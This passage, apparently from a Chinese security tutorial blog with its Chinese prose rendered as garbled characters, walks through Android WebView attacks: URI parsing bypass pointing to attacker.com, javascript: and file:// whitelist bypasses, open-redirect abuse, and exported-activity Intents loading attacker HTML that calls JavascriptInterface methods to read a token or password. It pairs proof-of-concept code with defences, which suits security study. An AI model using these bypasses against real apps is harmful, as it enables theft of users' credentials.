pathPartClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">                pathPartConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">                <span class="type">Class</span> <span class="variable">hierarchicalUriClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$HierarchicalUri&quot;</span>);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">hierarchicalUriConstructor</span> <span class="operator">=</span> hierarchicalUriClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">                hierarchicalUriConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//æ„é€ HierachicalUriå®ä¾‹</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">authority</span> <span class="operator">=</span> partConstructor.newInstance(<span class="string">&quot;legitimate.com&quot;</span>, <span class="string">&quot;legitimate.com&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">path</span> <span class="operator">=</span> pathPartConstructor.newInstance(<span class="string">&quot;@attacker.com&quot;</span>, <span class="string">&quot;@attacker.com&quot;</span>);</span><br><span class="line">                uri = (Uri) hierarchicalUriConstructor.newInstance(<span class="string">&quot;https&quot;</span>, authority, path, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">            intent.setData(uri);</span><br><span class="line">            intent.setClass(<span class="built_in">this</span>, TestActivity.class);</span><br><span class="line">            startActivity(intent);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ–‡ä»¶<code>TestActivity.java</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">     <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">         <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line"> </span><br><span class="line">         <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line">         <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> intent.getData();</span><br><span class="line"> </span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;Scheme: &quot;</span> + uri.getScheme());</span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;UserInfo: &quot;</span> + uri.getUserInfo());</span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;Host: &quot;</span> + uri.getHost());</span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;toString(): &quot;</span> + uri.toString());</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><strong>æ¼æ´é˜²æŠ¤ï¼š</strong></p><p>æˆ‘ä»¬åªéœ€è¦è®©æ”»å‡»çš„åº”ç”¨ç¨‹åºè·å–<code>Uri</code>æ”»å‡»è€…æ§åˆ¶çš„å¯¹è±¡å¹¶ä¸“é—¨ä½¿ç”¨è¯¥å¯¹è±¡</p><p>Uri uri = Uri.parse(intent.getData().toString());</p><p>ä» API çº§åˆ« 28 (Android 9) å¼€å§‹ï¼Œ<a href="https://developer.android.com/guide/app-compatibility/restrictions-non-sdk-interfaces">ç¦æ­¢</a>ä½¿ç”¨å†…éƒ¨æ¥å£â€”â€”ä½†è¿™å¯ä»¥é€šè¿‡ä½¿ç”¨<a href="https://github.com/ChickenHook/RestrictionBypass">RestrictionBypass</a>ç­‰å·¥å…·è½»æ¾ç»•è¿‡</p><h5 id="URL-Schemeç»•è¿‡">URL Schemeç»•è¿‡</h5><p><strong>æ¼æ´åŸç†</strong></p><p>ä»£ç åœ¨è¿›è¡Œurlæ ¡éªŒæ—¶ï¼Œæ£€æŸ¥äº†hostï¼Œä½†æ˜¯æœªæ£€æŸ¥Schemeï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡â€œjavascriptâ€ç»•è¿‡ã€‚</p><p>ä¾‹å¦‚ï¼š</p><p>ç›¸å½“äºæ‰§è¡Œäº†ä¸€è¡Œjsä»£ç ï¼Œç¬¬ä¸€è¡Œé€šè¿‡//ç¬¦å·æ¥éª—è¿‡java.net.URIè·å–åˆ°å€¼ä¸ºwww.mysite.comçš„hostï¼Œæ°å¥½//ç¬¦å·åœ¨Javascriptçš„ä¸–ç•Œé‡Œæ˜¯è¡Œæ³¨é‡Šç¬¦å·ï¼Œæ‰€ä»¥ç¬¬ä¸€è¡Œå®é™…å¹¶æ²¡æœ‰æ‰§è¡Œï¼›ç„¶åé€šè¿‡%0d%0aæ¢è¡Œï¼Œç»§ç»­æ‰§è¡Œwindow.location.href=â€™<a href="http://www.bing.com">http://www.bing.com</a>â€™</p><p><img src="/posts/f416437f.htm/905443_CY63B8H4GFW7TGH.png" alt="image-20220730132455921"></p><p>ä¹Ÿå¯ä»¥é€šè¿‡<code>file://www.mysite.com/sdcard/evil.html</code>ç»•è¿‡ï¼ŒæŸäº›ç‰ˆæœ¬WebViewå¯æ­£å¸¸è§£æä¸º<code>file:///sdcard/evil.html</code></p><p>å…¶ä¸­ <strong>window.location.href</strong></p><ul><li>æ˜¯javascriptä¸­ä¸€ä¸ªéå¸¸å¸¸ç”¨çš„å±æ€§ï¼Œå®ƒç”¨äºè·å–æˆ–è®¾ç½®å½“å‰çª—å£æˆ–æ ‡ç­¾é¡µé¢çš„URLã€‚è¿™ä¸ªå±æ€§<strong>è¿”å›å®Œæ•´çš„URL</strong></li></ul><p><strong>æ¼æ´å¤ç°</strong></p><p><img src="/posts/f416437f.htm/905443_6G9TXKBZB6B63JZ.png" alt="image-20220730132644522"></p><p>ç„¶åè¿›è¡Œæ„é€ html<br><img src="/posts/f416437f.htm/905443_47T7BWXAEHJ3XRX.png" alt="image-20220730132704180"></p><p><strong>å®‰å…¨é˜²æŠ¤</strong></p><p>URLæ ¡éªŒå‡½æ•°</p><p><img src="/posts/f416437f.htm/905443_JGTPHZEGNU7BAGX.png" alt="image-20220730132918854"></p><p><strong>Intent Schemeæ ¡éªŒå»ºè®®å†™æ³•</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span><span class="comment">//è§£æIntent Scheme URL</span></span><br><span class="line"><span class="number">2.</span> Intent <span class="built_in">int</span>ent = Intent.parseUri(uriï¼Œ flags);</span><br><span class="line"><span class="number">3.</span><span class="comment">//ç¦æ­¢æ‰“å¼€æ²¡æœ‰BROWSABLEæ ‡ç­¾çš„Activity</span></span><br><span class="line"><span class="number">4.</span> <span class="built_in">int</span>ent.addCategory ( <span class="string">&quot;android.intent.category.BROWSABLE&quot;</span> );</span><br><span class="line"><span class="number">5.</span><span class="comment">//ç¦æ­¢è®¾ç½®intentçš„ç»„ä»¶</span></span><br><span class="line"><span class="number">6.</span> <span class="built_in">int</span>ent.setComponent( nu1l);</span><br><span class="line"><span class="number">7.</span><span class="comment">//ç¦æ­¢è®¾ç½®intentçš„selector</span></span><br><span class="line"><span class="number">8.</span> <span class="built_in">int</span>ent.setSelector(nul1);</span><br><span class="line"><span class="number">9.</span><span class="comment">//æ‰“å¼€intentæŒ‡å‘çš„activity</span></span><br><span class="line"><span class="number">10.</span>context.startActivityIfNeeded(<span class="built_in">int</span>entï¼Œ<span class="number">-1</span>);</span><br></pre></td></tr></table></figure><h5 id="æœåŠ¡å™¨è·³è½¬æ¼æ´ç»•è¿‡"><strong>æœåŠ¡å™¨è·³è½¬æ¼æ´ç»•è¿‡</strong></h5><p><strong>æ¼æ´åŸç†</strong></p><p>ç™½åå•åŸŸåå†…çš„æœåŠ¡ç«¯å‡ºç°è·³è½¬æ¼æ´æ—¶ï¼Œä»ç„¶å¯ä»¥é€šè¿‡æ£€æŸ¥ï¼Œå¹¶è°ƒç”¨JavascriptInterfaceï¼Œä¾‹å¦‚æˆ‘ä»¬æ„é€ ä¸€ä¸ªè¿™æ ·çš„URL</p><p><code>https:</code>/<code>/</code><a href="http://www.site1.com">www.site1.com</a><code>/</code>redirect.php?url<code>=</code>https:<code>/</code>/<code>www.baidu.com</code></p><p>å‰é¢çš„https:<code>/</code>/<code>www.site1.com</code>/<code>redirect.php</code>æ˜¯æˆ‘ä»¬æ„é€ çš„è™šæ‹Ÿç«™ç‚¹ï¼Œå½“ä¸»æœºè®¿é—®æ—¶ï¼Œæ‰“å¼€è¿™ä¸ªurlåï¼ŒæœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ª302å“åº”ï¼Œç„¶åæµè§ˆå™¨ä¼šè¯·æ±‚æŒ‡å®šçš„URLï¼Œå¯¹äºå…·æœ‰å•ç‚¹ç™»å½•åŠŸèƒ½çš„ç½‘ç«™ï¼Œè¿™ç§ç±»å‹çš„æ¥å£å¾ˆå¸¸è§ã€‚</p><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥æ„é€ URLæ¥ç»•è¿‡åŸŸåç™½åå•ï¼š</p><p><code>https://www.site1.com/redirect.php?url=http://223.****.32:8080/poc.htm</code></p><p><strong>æ¼æ´å¤ç°</strong></p><p>é¦–å…ˆæˆ‘ä»¬ç¼–å†™æ”»å‡»çš„htmï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="variable language_">window</span>.<span class="property">myObj</span>.<span class="title function_">getToken</span>());</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬ä½¿ç”¨æ–‡ä»¶æœåŠ¡å™¨æ¥è¿›è¡Œæ¨¡æ‹Ÿ<img src="/posts/f416437f.htm/905443_ABKZHS9QBDVBZH8.png" alt="image-20220730114753663"></p><p>æˆ‘ä»¬æ¥ç€ç¼–å†™æµ‹è¯•æ ·æœ¬ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLWebView</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">JsObject</span> &#123;</span><br><span class="line">        <span class="meta">@JavascriptInterface</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getToken</span><span class="params">()</span> &#123;</span><br><span class="line">            Log.e(<span class="string">&quot;rebeyond&quot;</span>,<span class="string">&quot;i am in getToken&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&#123;\&quot;token\&quot;:\&quot;1234567890abcdefg\&quot;&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_url_web_view);</span><br><span class="line"> </span><br><span class="line">        <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview4);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>());</span><br><span class="line">        webView.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>());</span><br><span class="line">        webView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">JsObject</span>(),<span class="string">&quot;myObj&quot;</span>);</span><br><span class="line">        String inputUrl=<span class="string">&quot;https://www.site1.com/redirect.php?url=http://223.****:8080/poc.htm&quot;</span>; <span class="comment">//ipåœ°å€è‡ªå·±å†™è‡ªå·±çš„</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (checkDomain(inputUrl))</span><br><span class="line">            &#123;</span><br><span class="line">                Log.e(<span class="string">&quot;rebeyond&quot;</span>,<span class="string">&quot;i am a white domain&quot;</span>);</span><br><span class="line">                <span class="comment">//webView.loadUrl(inputUrl);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (URISyntaxException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkDomain</span><span class="params">(String inputUrl)</span> <span class="keyword">throws</span>  URISyntaxException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!inputUrl.startsWith(<span class="string">&quot;http://&quot;</span>)&amp;&amp;!inputUrl.startsWith(<span class="string">&quot;https://&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] whiteList=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;site1.com&quot;</span>,<span class="string">&quot;site2.com&quot;</span>&#125;;</span><br><span class="line">        java.net.URI url=<span class="keyword">new</span> <span class="title class_">java</span>.net.URI(inputUrl);</span><br><span class="line">        String inputDomain=url.getHost(); <span class="comment">//æå–host</span></span><br><span class="line">        <span class="keyword">for</span> (String whiteDomain:whiteList)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (inputDomain.endsWith(<span class="string">&quot;.&quot;</span>+whiteDomain)) <span class="comment">//www.site1.com      app.site2.com</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>  <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ†æä»£ç ä¸­æœ‰ä¸€ä¸ªç™½åå•çš„åŸŸåæ£€æµ‹å‡½æ•°<code>checkDomain</code>,ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ URLæ¥ç»•è¿‡ï¼š</p><p><code>https://www.site1.com/redirect.php?url=http://223.****:8080/poc.htm</code></p><h5 id="fileåè®®ç»•è¿‡">fileåè®®ç»•è¿‡</h5><p><a href="https://mabin004.github.io/2019/04/23/Android-WebView%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/">Android WebView URLæ£€æŸ¥ç»•è¿‡</a></p><p>appç»å¸¸ä¼šä½¿ç”¨file://åè®®åŠ è½½æœ¬åœ°æ–‡ä»¶ï¼Œé€šå¸¸ä¼šé™åˆ¶åœ¨ä¸€äº›ç‰¹å®šçš„è·¯å¾„ä¸­ï¼Œ</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)ä¸è¦ç”¨url.startWith(â€file:<span class="regexp">//</span>â€)æ¥åˆ¤æ–­æ˜¯å¦ä¸ºfileåè®®ï¼Œå› ä¸ºâ€œFILE:<span class="regexp">//</span>â€(å¤§å°)ã€â€œFile:<span class="regexp">//</span>â€(å¤§å°å†™)ã€â€œ file:<span class="regexp">//</span>â€(å‰è¾¹åŠ ç©ºæ ¼)ã€â€œfile:â€ç­‰æ–¹å¼éƒ½å¯ä»¥ç»•è¿‡æ£€æµ‹ã€‚url.contains(â€œfile:<span class="regexp">//</span>â€)æ›´ä¸é è°±ï¼Œæ¨èä½¿ç”¨getScheme()æ¥åˆ¤æ–­åè®®ï¼›</span><br><span class="line">(<span class="number">2</span>)file:<span class="regexp">//</span><span class="regexp">/android_assetå’Œfile:/</span><span class="regexp">//</span>android_res ä¹Ÿå¯ä»¥../ç©¿è¶Š</span><br><span class="line">(<span class="number">3</span>)ç™½åå•åˆ¤æ–­äº†â€œ..<span class="regexp">/ï¼Œä½†é€šè¿‡â€œ..\â€ä¹Ÿæ˜¯å¯ä»¥ç©¿è¶Šçš„ï¼Œä¾‹å¦‚file:/</span><span class="regexp">//</span>sdcard<span class="regexp">/..\../</span>sdcard/<span class="number">1</span>.html</span><br><span class="line">(<span class="number">4</span>)getHostæœ‰æ¼æ´ï¼ˆfile:<span class="regexp">//</span>a:a@www.qq.com:b@www.baidu.comä½¿ç”¨getHostè·å–åˆ°çš„æ˜¯qq.com,ä½†å®é™…è®¿é—®çš„æ˜¯baidu.com)</span><br><span class="line">(<span class="number">5</span>)file:<span class="regexp">//</span>baidu.com<span class="regexp">/data/</span>data/tmp å‰è¾¹çš„baidu.comæ˜¯å¯ä»¥ä¸è¢«è§£æçš„</span><br><span class="line">(<span class="number">6</span>)åè®®å¤´ä¸åŒ…æ‹¬<span class="regexp">//</span><span class="regexp">/ï¼Œè¿˜æ˜¯ä»ç„¶èƒ½å¤Ÿæ­£å¸¸loadUrlï¼Œå¦‚file:mnt/</span>sdcard/filedomain.html</span><br><span class="line">(<span class="number">7</span>)ç™½åå•åˆ¤æ–­äº†â€œ..<span class="regexp">/â€ï¼Œä½†é€šè¿‡urlç¼–ç ç»•è¿‡ï¼Œä¾‹å¦‚file:/</span><span class="regexp">//</span>data<span class="regexp">/data/</span>com.app<span class="regexp">/%2e%2e/</span>%<span class="number">2</span>e%<span class="number">2</span>e<span class="regexp">/%2e%2e/</span>sdcard/xxx</span><br><span class="line">(<span class="number">8</span>)replace(â€œ..<span class="regexp">/â€œ,â€â€) å¯ä»¥ä½¿ç”¨â€â€¦./</span><span class="regexp">/â€œç»•è¿‡  æ›¿æ¢ä¸€ä¸ª../</span> è¿˜æœ‰../å­˜åœ¨</span><br></pre></td></tr></table></figure><h4 id="Intent-WebView">Intent + WebView</h4><h5 id="Intentè®¿é—®å¯¼å‡ºç»„ä»¶åŠ è½½æ¶æ„ç•Œé¢å’Œçªƒå–ä¿¡æ¯"><strong>Intentè®¿é—®å¯¼å‡ºç»„ä»¶åŠ è½½æ¶æ„ç•Œé¢å’Œçªƒå–ä¿¡æ¯</strong></h5><p><strong>æ¼æ´åŸç†</strong></p><p>ä¸»è¦é€šè¿‡WebViewå¯¹å¤–æš´éœ²çš„æ¥å£å’ŒIntentè®¿é—®å¯¼å‡ºç»„ä»¶å¯ä»¥å¯¼è‡´çš„æ”»å‡»æ‰‹æ®µ</p><p><strong>æ¼æ´å¤ç°</strong></p><p>æ ·ä¾‹ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JsIntentActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_js_intent);</span><br><span class="line">        <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.Wind_webviewIntent);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        webView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">AndroidtoJs</span>(), <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        webView.loadData(<span class="string">&quot;&quot;</span>, <span class="string">&quot;text/html&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">getUri</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line">        webView.loadUrl(String.valueOf(getUri));</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æä¾›æ¥å£åœ¨Webviewä¸­ä¾›JSè°ƒç”¨</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AndroidtoJs</span> &#123;</span><br><span class="line">        <span class="comment">// å®šä¹‰JSéœ€è¦è°ƒç”¨çš„æ–¹æ³•ï¼Œè¢«JSè°ƒç”¨çš„æ–¹æ³•å¿…é¡»åŠ å…¥@JavascriptInterfaceæ³¨è§£</span></span><br><span class="line">        <span class="meta">@JavascriptInterface</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;WindXaa12345678&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹å‡ºæˆ‘ä»¬è·å–äº†å¯†ç <code>WindXaa12345678</code>ï¼Œä¸€èˆ¬åº”ç”¨ç¨‹åºä¼šå¯¹è¿™é‡Œè¿›è¡ŒåŠ å¯†æˆ–è€…æ··æ·†ï¼Œæˆ‘ä»¬è¿™é‡Œç®€å•æ¼”ç¤ºå°±ä¸è¿›è¡ŒåŠ å¯†äº†</p><p>æˆ‘ä»¬å°†è¯¥ç»„ä»¶è®¾ç½®ä¸ºå¯¼å‡ºç»„ä»¶</p><p><img src="/posts/f416437f.htm/905443_8793MBMDUVDZESQ.png" alt="image-20220729171422196"></p><p>æˆ‘ä»¬å¯¹å®ä¾‹æ ·æœ¬åˆ†æï¼Œè¿™é‡Œå°±å¯ä»¥åˆ©ç”¨æ¥å£å¯¼å‡ºçš„æ¼æ´è¿›è¡Œæ”»å‡»</p><p>ç¼–å†™æ”»å‡»æ ·æœ¬:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">Intent</span> <span class="variable">attackIntent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">                attackIntent.setClassName(<span class="string">&quot;com.iwindxaa.webview&quot;</span>,<span class="string">&quot;com.iwindxaa.webview.JsIntentActivity&quot;</span>);</span><br><span class="line">                attackIntent.setData(Uri.parse(<span class="string">&quot;http://ipåœ°å€ç«¯å£å·/attack.html&quot;</span>));</span><br><span class="line">                startActivity(attackIntent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬åœ¨æœ¬åœ°ç¼–å†™æ¶æ„çš„htmlï¼Œåˆ©ç”¨å‰é¢è®²è¿°çš„è¿œç¨‹åŠ è½½</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>WebView Atack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         <span class="keyword">function</span> <span class="title function_">callAndroid</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="comment">//ç”±äºå¯¹è±¡æ˜ å°„ï¼Œæ‰€ä»¥è°ƒç”¨testå¯¹è±¡ç­‰äºè°ƒç”¨Androidæ˜ å°„çš„å¯¹è±¡</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> password = test.<span class="title function_">getPassword</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;getdata&quot;</span>).<span class="property">innerHTML</span>= password;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;getdata&quot;</span>&gt;</span>æ”»å‡»è·å¾—çš„æ•°æ®å°†æ˜¾ç¤ºåœ¨æ­¤â€¦â€¦<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span 